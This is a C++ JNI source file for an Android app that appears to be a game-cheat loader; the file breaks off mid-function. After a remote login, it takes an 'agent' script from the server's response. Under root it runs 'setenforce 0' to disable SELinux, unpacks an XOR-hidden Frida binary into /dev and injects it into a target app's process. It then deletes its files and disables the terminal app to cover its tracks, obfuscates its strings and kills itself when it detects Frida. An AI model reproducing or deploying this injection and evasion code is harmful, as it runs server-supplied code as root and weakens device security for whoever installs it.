#include <jni.h>
#include <string>
#include <android/log.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sstream>
#include <asm/ptrace.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>


#include "RootManager/RootManager.h"
#include "LoginInterface/LoginInterface.h"
#include "Utils/obfuscate.h"
#include "DRM/DRM.h"
#include "JSONObject/JSONObject.h"
#include "RSA/RSA.h"
#include "Base64/Base64.h"
#include "HttpURLConnection/HttpURLConnection.h"
#include "Activity/Activity.h"
#include "Icon.h"
#include "SharedPreferences/SharedPreferences.h"
#include "Deauther/Deauther.h"

#define LOG_TAG "Debug"
#define LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)


static  JavaVM* javaVM = NULL;

namespace Logout{
    jclass  LoginActivityClassGlobalRefs   = NULL;
    jobject LoginActivityContextGlobalRefs = NULL;
}

namespace Security{
    __attribute__ ((visibility ("hidden")))
    const char* concatenatedLocalSignature = OBFUSCATE("384085863935706367241338183446");

    __attribute__ ((visibility ("hidden")))
    bool isVirtual = false;
}

namespace Loader {

    __attribute__ ((visibility ("hidden")))
    static std::string  target  = "";

    __attribute__ ((visibility ("hidden")))
    static std::string  targetActivity      = OBFUSCATE("com.android.MyActivity");

    __attribute__ ((visibility ("hidden")))
    static const char*  fridaFileName        = OBFUSCATE("loader");

    __attribute__ ((visibility ("hidden")))
    static const char*  agentFileName        = OBFUSCATE("shell");

    __attribute__ ((visibility ("hidden")))
    static const char*  scriptFileName       = OBFUSCATE("bash");

    __attribute__ ((visibility ("hidden")))
    static       char   agentString[32768];

    __attribute__ ((visibility ("hidden")))
    std::string         scriptString        = OBFUSCATE("TERMINAL=$(ps -e | grep jackpal.androidterm | awk '{print $2}' )\n"
                                                 "TARGET=$(ps -e | grep REPLACE_WITH_PACKAGE_NAME | awk '{print $2}' )\n"
                                                 "if [ -z $TARGET ]\n"
                                                 "then\n"
                                                 "  echo \"Error\"\n"
                                                 "else\n"
                                                 "  cd /dev\n"
                                                 "  ./REPLACE_WITH_FRIDA_FILE_NAME -p $TARGET -s REPLACE_WITH_AGENT_FILE_NAME -e\n"
                                                 "  am start -n REPLACE_WITH_PACKAGE_NAME/REPLACE_WITH_TARGET_ACTIVITY\n"
                                                 "  rm -rf REPLACE_WITH_AGENT_FILE_NAME\n"
                                                 "  rm -rf REPLACE_WITH_FRIDA_FILE_NAME\n"
                                                 "  rm -rf REPLACE_WITH_SCRIPT_FILE_NAME\n"
                                                 "  pm disable jackpal.androidterm\n"
                                                 "fi");
}

namespace LoginInterfaceComponent {

    __attribute__ ((visibility ("hidden")))
    const char* URL = OBFUSCATE("https://api.gamingbd.xyz/api/login.php");

    __attribute__ ((visibility ("hidden")))
    jobject LoginActivityContext = NULL;

    __attribute__ ((visibility ("hidden")))
    jobject UsernameEditText     = NULL;
    __attribute__ ((visibility ("hOBFUSCATE(idden")))
    jobject PasswordEditText     = NULL;
    __attribute__ ((visibility ("hidden")))
    jobject LoginButton          = NULL;
    __attribute__ ((visibility ("hidden")))
    jobject ProgressBar          = NULL;

    __attribute__ ((visibility ("hidden")))
    jstring UsernameString       = NULL;
    __attribute__ ((visibility ("hidden")))
    jstring DeviceIdString       = NULL;

    __attribute__ ((visibility ("hidden")))
    jstring HackName       = NULL;
}


/**------------------------------- Security ------------------------------------------------------*/

__attribute__ ((visibility ("hidden")))
typedef unsigned long long DWORD;
__attribute__ ((visibility ("hidden")))
DWORD getLibraryBase(const char* libName) {

    FILE *fp;
    DWORD address = 0;

    char filename[32], buffer[1024];
    snprintf(filename, sizeof(filename), OBFUSCATE("/proc/%d/maps"), getpid());
    fp = fopen(filename, OBFUSCATE("rt"));

    if (fp != NULL) {
        while (fgets(buffer, sizeof(buffer), fp)) {
            if (strstr(buffer, libName)) {
                address = (uintptr_t) strtoul(buffer, NULL, 16);
                break;
            }
        }
        fclose(fp);
    }
    return address;
}

__attribute__ ((visibility ("hidden")))
void*  OnContainerContamination(void* ){
    sleep(1);
    exit(1);
}


__attribute__ ((visibility ("hidden")))
void* MonitorProcess(void* ) {

    JNIEnv* env;
    javaVM->AttachCurrentThread( &env, NULL);

    if ( env != NULL ){

        LOGD("%s", "Attached");
        while( 1 ){
            DWORD base = getLibraryBase(OBFUSCATE("frida"));
            if ( base > 0 ){
                pthread_t ptid;
                pthread_create(&ptid, NULL, OnContainerContamination, NULL);
            }
            sleep(1);
        }
    }

    javaVM->DetachCurrentThread();
    return NULL;
};


__attribute__ ((visibility ("hidden")))
void VerifySignature(JNIEnv *env, jclass clazz, jobject context) {

    /* Sequence: Manifest + Dex + Resources */
    /* Getting Live Signatures */
    jstring     manifestSignature       = DRM::getSignature( env , context, env->NewStringUTF(OBFUSCATE("AndroidManifest.xml"))  );
    jstring     dexSignature            = DRM::getSignature( env , context, env->NewStringUTF(OBFUSCATE("classes.dex"))          );
    jstring     resourceSignature       = DRM::getSignature( env , context, env->NewStringUTF(OBFUSCATE("resources.arsc"))       );

    /* Concatenating Signatures (String) */
    jclass      StringBuilder           = env->FindClass("java/lang/StringBuilder");
    jmethodID   constructStringBuilder  = env->GetMethodID( StringBuilder, "<init>", "()V");
    jobject     stringBuilder           = env->NewObject(StringBuilder, constructStringBuilder);

    jmethodID append = env->GetMethodID(StringBuilder, "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;");
    for ( auto string: {manifestSignature, dexSignature, resourceSignature } ) {
        env->CallObjectMethod(stringBuilder, append, string);
    }

    /* Getting Concatenated Live Signature */
    jmethodID   toString                    = env->GetMethodID(StringBuilder, "toString", "()Ljava/lang/String;");
    jstring     concatenatedSignatureLive   = static_cast<jstring>(env->CallObjectMethod(stringBuilder, toString));

    /* Getting Concatenated Local Signature */

    LOGD("Live  : %s ", env->GetStringUTFChars(concatenatedSignatureLive, NULL));
    LOGD("Local : %s ", Security::concatenatedLocalSignature);

//    /* Comparing Signatures */
//    if ( strcmp(env->GetStringUTFChars(concatenatedSignatureLive, NULL), Security::concatenatedLocalSignature  ) == 0 ){
//        LOGD("%s", (const char* ) OBFUSCATE("Success"));
//        return;
//    }
//    else{
//        LOGD("%s", (const char*)OBFUSCATE("Failed!"));
//        pthread_t ptid;
//        pthread_create(&ptid, NULL, OnContainerContamination, NULL);
//    }


}

/*------------------------------------------------------------------------------------------------*/





/**---------------------------------- LoginActivity.java -----------------------------------------*/

/**@brief Setup User Interface for Login
 * @param env
 * @param context
 */
__attribute__ ((visibility ("hidden")))
void setUserInterfaceNative(JNIEnv *env, jobject context) {

    /*----------------------------- Init User Interface ------------------------------------------*/
    LoginInterface loginInterface                   = LoginInterface(env, context);

    LoginInterfaceComponent::LoginActivityContext   = env->NewGlobalRef(context);
    LoginInterfaceComponent::UsernameEditText       = env->NewGlobalRef(loginInterface.usernameEditTextGlobalRefs);
    LoginInterfaceComponent::PasswordEditText       = env->NewGlobalRef(loginInterface.passwordEditTextGlobalRefs);
    LoginInterfaceComponent::LoginButton            = env->NewGlobalRef(loginInterface.loginButtonGlobalRefs);
    LoginInterfaceComponent::ProgressBar            = env->NewGlobalRef(loginInterface.progressBarGlobalRefs);

    /*------------------------------ Reading SharedPreferences  ----------------------------------*/
    {
        SharedPreferences   sharedPreferences   = SharedPreferences(env,context);
        jstring             userPrefs           = sharedPreferences.getPreference(env->NewStringUTF("User"));
        if  ( userPrefs != NULL ){
            /* usernameEditText.setText(userPrefs); */
            jclass      EditText    = env->FindClass("android/widget/EditText");
            jmethodID   setText     = env->GetMethodID(EditText,"setText", "(Ljava/lang/CharSequence;)V");
            env->CallVoidMethod( LoginInterfaceComponent::UsernameEditText, setText,userPrefs);
            /* passwordEditText.setText("1234"); */
            env->CallVoidMethod( LoginInterfaceComponent::PasswordEditText, setText, env->NewStringUTF(OBFUSCATE("1234")));
        }
    }

    /*--------------------------------- Signature Verification -----------------------------------*/
    {
        jclass LoginActivity = env->FindClass(OBFUSCATE("gamingbd/pro/LoginActivity"));
        VerifySignature(env, LoginActivity, context);
    }

    /** Preventing the Debugger */
    {
        env->GetJavaVM(&javaVM);

        pthread_t ptid;
        pthread_create(&ptid, NULL, MonitorProcess, NULL);
    }

    /** Get Terminal Emulator Permission */
    {

        /* String host = RootManager.getInstance().runCommand("uname -a").getMessage(); */
        jstring     host        = RootManager::runCommandS(env, env->NewStringUTF(OBFUSCATE("uname -a") ));

        /* return  host.contains("-titan") */
        jclass      String      = env->FindClass("java/lang/String");
        jmethodID   contains    = env->GetMethodID(String, "contains", "(Ljava/lang/CharSequence;)Z");
        if (  env->CallBooleanMethod(host, contains, env->NewStringUTF(OBFUSCATE("titan"))) ){

            Security::isVirtual = true;
            jclass      LoginActivity               = env->FindClass(OBFUSCATE("gamingbd/pro/LoginActivity"));
            jmethodID   isTerminalPermissionGranted = env->GetStaticMethodID(LoginActivity, OBFUSCATE("isTerminalPermissionGranted"), "(Landroid/content/Context;)Z");
            if ( !env->CallStaticBooleanMethod(LoginActivity, isTerminalPermissionGranted, context) ){
                jmethodID   getTerminalPermission   = env->GetStaticMethodID(LoginActivity, OBFUSCATE("getTerminalPermission"), "(Landroid/content/Context;)V");
                env->CallStaticVoidMethod(LoginActivity, getTerminalPermission, context);
                exit(0);
            }
        }


        /* For Logout */
        {
            jclass LoginActivity = env->FindClass("gamingbd/pro/LoginActivity");
            Logout::LoginActivityClassGlobalRefs   = (jclass)(env->NewGlobalRef(LoginActivity));
            Logout::LoginActivityContextGlobalRefs = env->NewGlobalRef(context);
        }
    }

}

/** @brief  Native Callback to Handle Click Event.
 *
 *  This function is called back from onClick() method when a view attached to it is clicked.
 *  Caller's context and the view that is clicked are parsed to this function.
 *
 * @param env       Pointer to JNIEnv
 * @param clazz     Caller's class
 * @param context   Caller's context
 * @param view      The view that is clicked
 */
__attribute__ ((visibility ("hidden")))
void onClickNative(JNIEnv *env, jclass clazz, jobject context,jobject view ) {

    /* Exception ID: 100 */
    if ( LoginInterfaceComponent::UsernameEditText == NULL || LoginInterfaceComponent::PasswordEditText == NULL  ){
        LOGD("Exception ID 100");
        return;
    }

    /* passwordEditText.setText("1234"); */
    {
        jclass      EditText        = env->FindClass("android/widget/EditText");
        jmethodID   setText         = env->GetMethodID(EditText,"setText", "(Ljava/lang/CharSequence;)V");
        env->CallVoidMethod(LoginInterfaceComponent::PasswordEditText, setText, env->NewStringUTF(OBFUSCATE("1234")));
        env->DeleteLocalRef(EditText);
    }

    jstring usernamejString;
    /* String username = usernameEditText.getText().toString().trim() */
    {
        jclass      EditText        = env->FindClass("android/widget/EditText");
        jmethodID   getTextMethod   = env->GetMethodID(EditText,"getText", "()Landroid/text/Editable;");
        jobject     getText         = env->CallObjectMethod(LoginInterfaceComponent::UsernameEditText, getTextMethod );

        jclass      Object          = env->FindClass("java/lang/Object");
        jmethodID   toString        = env->GetMethodID(Object,"toString", "()Ljava/lang/String;");
        usernamejString             = static_cast<jstring>( env->CallObjectMethod(getText, toString));

        jclass      String          = env->FindClass("java/lang/String");
        jmethodID   trim            = env->GetMethodID(String, "trim", "()Ljava/lang/String;");
        usernamejString             = static_cast<jstring>(env->CallObjectMethod(usernamejString, trim));

        env->DeleteLocalRef(EditText);
        env->DeleteLocalRef(getText);
        env->DeleteLocalRef(Object);
        env->DeleteLocalRef(String);
    }

    /* Checking if username is valid string */
    const char* username        = env->GetStringUTFChars(usernamejString,NULL);
    if ( strlen(username) <= 0 ){

        LOGD("%s", (const char*) OBFUSCATE("Username Empty"));

        /* UsernameEditText.setError("Field is empty"); */
        {
            jclass      TextView        = env->FindClass("android/widget/TextView");
            jmethodID   setError        = env->GetMethodID(TextView,"setError", "(Ljava/lang/CharSequence;)V");
            env->CallVoidMethod(LoginInterfaceComponent::UsernameEditText, setError, env->NewStringUTF("Field is empty"));
        }

        /* UsernameEditText.requestFocus(); */
        {
            jclass      View            = env->FindClass("android/view/View");
            jmethodID   requestFocus    = env->GetMethodID(View, "requestFocus", "()Z");
            env->CallBooleanMethod(LoginInterfaceComponent::UsernameEditText, requestFocus);
        }

        return;
    }

    /* loginButton.setVisibility(View.GONE); */
    {
        jclass      View            = env->FindClass("android/view/View");
        jmethodID   setVisibility   = env->GetMethodID(View, "setVisibility", "(I)V");
        env->CallVoidMethod(LoginInterfaceComponent::LoginButton, setVisibility, LoginInterface::GONE);
        env->DeleteLocalRef(View);
    }

    /* progressBar.setVisibility(View.VISIBLE); */
    {
        jclass      View            = env->FindClass("android/view/View");
        jmethodID   setVisibility   = env->GetMethodID(View, "setVisibility", "(I)V");
        env->CallVoidMethod(LoginInterfaceComponent::ProgressBar, setVisibility, LoginInterface::VISIBLE);
        env->DeleteLocalRef(View);
    }

    /* Updating the username & deviceId */
    {
        LoginInterfaceComponent::UsernameString = static_cast<jstring>( env->NewGlobalRef(env->NewStringUTF(username)) );
        LoginInterfaceComponent::DeviceIdString = static_cast<jstring>( env->NewGlobalRef(DRM::getUniqueDeviceID(env)) );
    }

    //LOGD("Line 156: %s %s", env->GetStringUTFChars(LoginInterfaceComponent::UsernameString, NULL), env->GetStringUTFChars(LoginInterfaceComponent::DeviceIdString, NULL) );

    /** Execute the network request to handle login */
     {
        /* NetworkRequest networkRequest = new NetworkRequest(context); */
        jclass      NetworkRequest              = env->FindClass(   OBFUSCATE("gamingbd/pro/NetworkRequest"));
        jmethodID   NetworkRequestConstructor   = env->GetMethodID( NetworkRequest, "<init>", "(Landroid/content/Context;)V");
        jobject     networkRequest              = env->NewObject(   NetworkRequest, NetworkRequestConstructor, context );

        /* networkRequest.execute(); */
        jmethodID   execute = env->GetMethodID(NetworkRequest,OBFUSCATE("execute"), "([Ljava/lang/Object;)Landroid/os/AsyncTask;");
        env->CallObjectMethod(networkRequest, execute, (jobjectArray) NULL);

        env->DeleteLocalRef(NetworkRequest);
        env->DeleteLocalRef(networkRequest);
    }

}

/**@brief Native Callback to Execute Task in Non UI Background Thread.
 *
 *  This function is called back from doInBackground() method when NetworkRequest is executed
 *
 * @param env   Pointer to JNIEnv
 * @param clazz Caller's class
 * @return jstring Return string ( usually the response from server ).
 */
__attribute__ ((visibility ("hidden")))
jstring doInBackgroundNative(JNIEnv *env, jclass clazz) {

    JSONObject jsonObject = JSONObject(env);
    jsonObject.put(env->NewStringUTF(OBFUSCATE("username")), LoginInterfaceComponent::UsernameString         );
    jsonObject.put(env->NewStringUTF(OBFUSCATE("device"  )), LoginInterfaceComponent::DeviceIdString         );
    jstring jsonString = jsonObject.toString();

    /* Encrypting Data */
    jsonString = RSA::encryptByChunks(env, jsonString);

    /* Encode Data in Base64 format which is suitable for using in network communication*/
    jsonString = Base64::toBase64String(env, jsonString);

    std::string parameters = OBFUSCATE("data=");
    parameters.append(env->GetStringUTFChars(jsonString, NULL));


    jstring response = HttpURLConnection::POST(env, env->NewStringUTF(LoginInterfaceComponent::URL), env->NewStringUTF( parameters.c_str() ));
    return response;

}

/**@brief Native Callback to Execute Task After Non UI Background Thread Finishes It's Execution.
 * @param env
 * @param clazz
 * @param context
 * @param response String The string (usually server response) returned from doInBackground().
 */
__attribute__ ((visibility ("hidden")))
void onPostExecuteNative(JNIEnv *env, jclass clazz, jobject context,jstring response) {

    /* progressBar.setVisibility(View.VISIBLE); */
    {
        jclass      View            = env->FindClass("android/view/View");
        jmethodID   setVisibility   = env->GetMethodID(View, "setVisibility", "(I)V");
        env->CallVoidMethod(LoginInterfaceComponent::ProgressBar, setVisibility, LoginInterface::GONE );
        env->DeleteLocalRef(View);
    }

    /* loginButton.setVisibility(View.GONE); */
    {
        jclass      View            = env->FindClass("android/view/View");
        jmethodID   setVisibility   = env->GetMethodID(View, "setVisibility", "(I)V");
        env->CallVoidMethod(LoginInterfaceComponent::LoginButton, setVisibility, LoginInterface::VISIBLE );
        env->DeleteLocalRef(View);
    }

    /* Checking Internet | Server error */
    if ( strcmp( env->GetStringUTFChars(response, NULL) , OBFUSCATE("Internet not available | Server error" )) == 0 ){
        Activity::Toast(env, LoginInterfaceComponent::LoginActivityContext  , response, 0);
        return;
    }

    /* Decrypting Data */
    {
        response = Base64::fromBase64String(env, response);
        response = RSA::decryptByChunks(env, response, env->NewStringUTF(OBFUSCATE("#")));
    }


    /* Converting to JSON Object */
    JSONObject responseJsonObject = JSONObject(env, response);
    //LOGD("%s", env->GetStringUTFChars(response, NULL));

    /* Getting the message from response */
    jstring message = responseJsonObject.getString(env->NewStringUTF(OBFUSCATE("message")));
    Activity::Toast(env, context, message, 0);


    if ( strcmp( env->GetStringUTFChars(message, NULL), OBFUSCATE("Usuario autenticado")) == 0 ){

        /** Store username in SharedPreferences */
        {
            SharedPreferences sharedPreferences = SharedPreferences(env, context);
            sharedPreferences.setPreference(env->NewStringUTF(OBFUSCATE("User")), LoginInterfaceComponent::UsernameString);
        }

        /* Store the hack name */
        {
            jstring                  HackName = responseJsonObject.getString(env->NewStringUTF(OBFUSCATE("name")));
            LoginInterfaceComponent::HackName = static_cast<jstring>(env->NewGlobalRef(HackName));
            //LOGD("%s", env->GetStringUTFChars( LoginInterfaceComponent::HackName  , NULL ));
        }

        /* Getting & Setting agent Sent from Server */
        {
            jstring     agentString         = responseJsonObject.getString(env->NewStringUTF(OBFUSCATE("agent")));
            strcpy(Loader::agentString,env->GetStringUTFChars(agentString, NULL) );
        }

        /* Launch next activity */
        {
            jclass      LoginActivity   = env->FindClass(OBFUSCATE("gamingbd/pro/LoginActivity"));
            jmethodID   enter           = env->GetMethodID(LoginActivity, OBFUSCATE("enter"), "()V");
            env->CallVoidMethod(LoginInterfaceComponent::LoginActivityContext,enter);
        }
    }

}

/**@brief Register JNI Methods for LoginActivity Class
 * @param env
 * @return int The status code
 */
__attribute__ ((visibility ("hidden")))
int registerLoginActivityClassMethods(JNIEnv* env){

    jclass LoginActivityClass = env->FindClass("gamingbd/pro/LoginActivity");
    JNINativeMethod LoginActivityClassMethodList[] = {
            {"setUserInterfaceLoginNative"   , "()V"                                             , (void*) setUserInterfaceNative    },
            {"onClickLoginNative"            , "(Landroid/content/Context;Landroid/view/View;)V" , (void*) onClickNative             },
            {"doInBackgroundLoginNative"     , "()Ljava/lang/String;"                            , (void*) doInBackgroundNative      },
            {"onPostExecuteLoginNative"      , "(Landroid/content/Context;Ljava/lang/String;)V"  , (void*) onPostExecuteNative       }
    };
    return env->RegisterNatives(LoginActivityClass, LoginActivityClassMethodList, sizeof(LoginActivityClassMethodList) / sizeof (LoginActivityClassMethodList[0]));

}

/**-----------------------------------------------------------------------------------------------*/









/** ---------------------------- Native.java -------- --------------------------------------------*/

/**@brief Get Base64 Encoded Image String for Floating Icon
 * @param env
 * @param clazz
 * @return jstring The base64 encoded image
 */
__attribute__ ((visibility ("hidden")))
jstring IconNative(JNIEnv *env, jclass clazz) {
    return GetIcon(env);
}

/**@brief Get Super User or Root Permission
 * @param env
 * @param clazz
 * @param context
 * @return jboolean The success or failed status
 */
__attribute__ ((visibility ("hidden")))
jboolean GetSuperUserPermission(JNIEnv *env, jclass clazz, jobject context) {
    if ( system(OBFUSCATE("su")) == 0 ){
        return true;
    }
    return false;
}

/**@brief Temporarily Disable SeLinux Enforcement Globally
 *
 * Security-Enhanced Linux (SeLinux) is a Linux Security Module (LSM) aimed to provide
 * Mandatory Access Control (MAC).
 * With SELinux enabled, root access can't do everything anymore because it imposes some
 * restriction such as restricting calls to ptrace (a linux kernel system call).
 *
 * @param env
 * @param clazz
 * @param context
 */
__attribute__ ((visibility ("hidden")))
void DisableSeLinux(JNIEnv *env, jclass clazz, jobject context) {
    RootManager::runCommandV(env,env->NewStringUTF(OBFUSCATE("setenforce 0")));
    if ( env->ExceptionCheck() ){
        env->ExceptionDescribe();
        env->ExceptionClear();
    }
}

/**@brief Register JNI Methods for Native Class
 * @param env
 * @return int The status code
 */
__attribute__ ((visibility ("hidden")))
int registerNativeClassMethods(JNIEnv* env){
    jclass NativeClass = env->FindClass("gamingbd/pro/Native");
    JNINativeMethod NativeClassMethodList[] = {
            {"IconNative"               , "()Ljava/lang/String;"            , (void*) IconNative                },
            {"GetSuperUserPermission"   , "(Landroid/content/Context;)Z"    , (void*) GetSuperUserPermission    },
            {"DisableSeLinux"           , "(Landroid/content/Context;)V"    , (void*) (DisableSeLinux)          }
    };
    return env->RegisterNatives(NativeClass, NativeClassMethodList, sizeof(NativeClassMethodList) / sizeof (NativeClassMethodList[0]));
}

/** ----------------------------------------------------------------------------------------------*/









/**--------------------------------- Loader.java -------------------------------------------------*/

/** Write Text in a New File in Cache Directory of Package
 *
 * @param env
 * @param context
 * @param fileName
 * @param fileContent
 */
__attribute__ ((visibility ("hidden")))
void writeTextFileInCache( JNIEnv* env, jobject context, jstring fileName, jstring fileContent ){

    /* File file = new File(context.getCacheDir(), fileName);*/
    jclass      Context         = env->FindClass("android/content/Context");
    jmethodID   getCacheDir     = env->GetMethodID(Context, OBFUSCATE("getCacheDir"), OBFUSCATE("()Ljava/io/File;"));
    jclass      File            = env->FindClass(OBFUSCATE("java/io/File"));
    jmethodID   FileConstructor = env->GetMethodID(File, OBFUSCATE("<init>"), OBFUSCATE("(Ljava/io/File;Ljava/lang/String;)V"));
    jobject     file            = env->NewObject(File, FileConstructor, env->CallObjectMethod(context, getCacheDir), fileName);

    /* FileOutputStream fileOutputStream = new FileOutputStream(file); */
    jclass      FileOutputStream                = env->FindClass(OBFUSCATE("java/io/FileOutputStream"));
    jmethodID   FileOutputStreamConstructor     = env->GetMethodID(FileOutputStream, OBFUSCATE("<init>"), OBFUSCATE("(Ljava/io/File;)V"));
    jobject     fileOutputStream                = env->NewObject(FileOutputStream, FileOutputStreamConstructor, file);

    /* fileOutputStream.write(fileContent.getBytes()); */
    jclass      String      = env->FindClass(OBFUSCATE("java/lang/String"));
    jmethodID   getBytes    = env->GetMethodID(String, OBFUSCATE("getBytes"), OBFUSCATE("()[B"));
    jmethodID   write       = env->GetMethodID(FileOutputStream, OBFUSCATE("write"), OBFUSCATE("([B)V"));
    env->CallVoidMethod(fileOutputStream, write, env->CallObjectMethod(fileContent,getBytes));
    if ( env->ExceptionCheck() ){
        env->ExceptionClear();
        env->ExceptionDescribe();
        LOGD("Line 442: Error");
    }

    /*  fileOutputStream.close(); */
    jmethodID close = env->GetMethodID(FileOutputStream, OBFUSCATE("close"), OBFUSCATE("()V"));
    env->CallVoidMethod(fileOutputStream, close);
}

/**@brief Replace Occurrences of a Given Substring.
 *
 * @param sourceString
 * @param search
 * @param replace
 */
__attribute__ ((visibility ("hidden")))
void replaceAll(std::string &sourceString, const  std::string &search, const  std::string &replace ) {
    for( size_t pos = 0; ; pos += replace.length() ) {
        // Locate the substring to replace
        pos = sourceString.find(search, pos );
        if( pos ==  std::string::npos ) break;
        // Replace by erasing and inserting
        sourceString.erase(pos, search.length() );
        sourceString.insert(pos, replace );
    }
}

__attribute__ ((visibility ("hidden")))
void doInBackgroundLoader(JNIEnv *env, jclass clazz, jobject context) {

    char command[1024];

    /** Disable and Enable Android Terminal Emulator to clear any leftover terminal session */
    {
        RootManager::runCommandV(env, env->NewStringUTF(OBFUSCATE("pm disable jackpal.androidterm")));
        RootManager::runCommandV(env, env->NewStringUTF(OBFUSCATE("pm enable jackpal.androidterm")));
    }

    /** Check if Terminal and it's permission is available for virtual inject even before extracting files, prevent crackers*/
    {
        if ( Security::isVirtual ){
            jstring     output      = RootManager::runCommandS(env, env->NewStringUTF(OBFUSCATE("pm list packages | grep jackpal.androidterm") ));
            jclass      String      = env->FindClass(OBFUSCATE("java/lang/String"));
            jmethodID   contains    = env->GetMethodID(String, OBFUSCATE("contains"), "(Ljava/lang/CharSequence;)Z");
            bool terminalAvailable  =  env->CallBooleanMethod(output, contains, env->NewStringUTF(OBFUSCATE("jackpal.androidterm")));
            if ( !terminalAvailable )
                return;

            /** Check if Terminal permission is granted */
            jclass      LoginActivity                   = env->FindClass(OBFUSCATE("gamingbd/pro/LoginActivity"));
            jmethodID   isTerminalPermissionGranted     = env->GetStaticMethodID(LoginActivity, OBFUSCATE("isTerminalPermissionGranted"), "(Landroid/content/Context;)Z");
            bool        terminalPermissionGranted       = env->CallStaticBooleanMethod(LoginActivity, isTerminalPermissionGranted, context);
            if ( !terminalPermissionGranted )
                exit(0);
        }
    }

    /** Decrypt and extract frida in cache & Move to /dev */
    {
        /** Read loader from asset in byte array and xor with every byte and save loader in cache */
        {
            DRM::extractXorOperatedPackageFile(env, context, 64,env->NewStringUTF(OBFUSCATE("assets/loader")), env->NewStringUTF(OBFUSCATE("loader")));
        }

        /* Copy decrypted loader to /dev */
        {
            sprintf(command, OBFUSCATE("cp %s%s /dev"), DRM::getPackageCachePath(env,context), Loader::fridaFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command) );
        }

        /* Delete loader from cache */
        {

            sprintf(command, OBFUSCATE("rm -rf %s/%s"), DRM::getPackageCachePath(env,context), Loader::fridaFileName   );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Change loader's permission */
        {
            sprintf(command, OBFUSCATE("chmod 777 /dev/%s"), Loader::fridaFileName );
            RootManager::runCommandV(env, env->NewStringUTF(command) );
        }

        /* Change loader's ownership */
        {
            sprintf(command, OBFUSCATE("chown root:root /dev/%s"), Loader::fridaFileName );
            RootManager::runCommandV(env, env->NewStringUTF(command) );
        }

    }

    /** Write agent in cache & Move to /dev */
    {
        /* Write agent content in a file in cache directory */
        {
            writeTextFileInCache(env, context,env->NewStringUTF(Loader::agentFileName),env->NewStringUTF(Loader::agentString));
        }

        /* Copy agent file to /dev */
        {
            sprintf(command, OBFUSCATE("cp %s%s /dev"), DRM::getPackageCachePath(env,context), Loader::agentFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Delete agent file form cache */
        {
            sprintf(command, OBFUSCATE("rm -rf %s/%s"), DRM::getPackageCachePath(env,context) , Loader::agentFileName );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Change agent file's permission */
        {
            sprintf(command, OBFUSCATE("chmod 777 /dev/%s"), Loader::agentFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Change agent file's ownership */
        {
            sprintf(command, OBFUSCATE("chown root:root /dev/%s"), Loader::agentFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }
    }

    /** Write script in cache & Move to /dev */
    {
        /**** Convert Dummy script to actual script *****/
        {
            replaceAll(Loader::scriptString,OBFUSCATE("REPLACE_WITH_PACKAGE_NAME"      ), Loader::target            );
            replaceAll(Loader::scriptString,OBFUSCATE("REPLACE_WITH_FRIDA_FILE_NAME"   ), Loader::fridaFileName     );
            replaceAll(Loader::scriptString,OBFUSCATE("REPLACE_WITH_AGENT_FILE_NAME"   ), Loader::agentFileName     );
            replaceAll(Loader::scriptString,OBFUSCATE("REPLACE_WITH_TARGET_ACTIVITY"   ), Loader::targetActivity    );
            replaceAll(Loader::scriptString,OBFUSCATE("REPLACE_WITH_SCRIPT_FILE_NAME"  ), Loader::scriptFileName    );
        }

        /* Write script content to file */
        {
            writeTextFileInCache(env, context,env->NewStringUTF(Loader::scriptFileName),env->NewStringUTF(Loader::scriptString.c_str()));
        }

        /* Copy script file to /dev */
        {
            sprintf(command, OBFUSCATE("cp %s%s /dev"), DRM::getPackageCachePath(env,context), Loader::scriptFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Delete script file from cache */
        {
            sprintf(command, OBFUSCATE("rm -rf %s/%s"), DRM::getPackageCachePath(env,context) , Loader::scriptFileName );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Change scirpt file's permission */
        {
            sprintf(command, OBFUSCATE("chmod 777 /dev/%s"), Loader::scriptFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }

        /* Change script file ownership */
        {
            sprintf(command, OBFUSCATE("chown root:root /dev/%s"), Loader::scriptFileName  );
            RootManager::runCommandV(env, env->NewStringUTF(command));
        }
    }

}



__attribute__ ((visibility ("hidden")))
void onPostExecuteLoader(JNIEnv *env, jclass clazz, jobject context) {


    if ( Security::isVirtual ){

        /** VIRTUAL INJECT */

        /* Intent intent = new Intent("jackpal.androidterm.RUN_SCRIPT"); */
        jclass      Intent              = env->FindClass("android/content/Intent");
        jmethodID   IntentConstructor   = env->GetMethodID(Intent, "<init>", "(Ljava/lang/String;)V");
        jobject     intent              = env->NewObject(Intent, IntentConstructor, env->NewStringUTF(OBFUSCATE("jackpal.androidterm.RUN_SCRIPT")));

        /* intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); */
        {
            int         FLAG_ACTIVITY_NEW_TASK  = 0x10000000;
            jmethodID   setFlags                = env->GetMethodID(Intent, OBFUSCATE("setFlags"),"(I)Landroid/content/Intent;");
            env->CallObjectMethod(intent, setFlags, FLAG_ACTIVITY_NEW_TASK);
        }

        /* intent.addCategory(Intent.CATEGORY_DEFAULT); */
        {
            jstring     CATEGORY_DEFAULT    = env->NewStringUTF(OBFUSCATE("android.intent.category.DEFAULT")) ;
            jmethodID   addCategory         = env->GetMethodID(Intent, OBFUSCATE("addCategory"),"(Ljava/lang/String;)Landroid/content/Intent;");
            env->CallObjectMethod(intent, addCategory, CATEGORY_DEFAULT);
        }

        /* intent.putExtra("jackpal.androidterm.iInitialCommand", command); */
        {
            /** Command to send to Android Terminal Emulator to execute */
            char command[1024];
            sprintf(command, OBFUSCATE("su\nsh /dev/%s"), Loader::scriptFileName );
            jmethodID putExtra = env->GetMethodID(Intent, OBFUSCATE("putExtra"), "(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;");
            env->CallObjectMethod(intent, putExtra, env->NewStringUTF(OBFUSCATE("jackpal.androidterm.iInitialCommand")), env->NewStringUTF(command) );
        }

        /* context.startActivity(intent); */
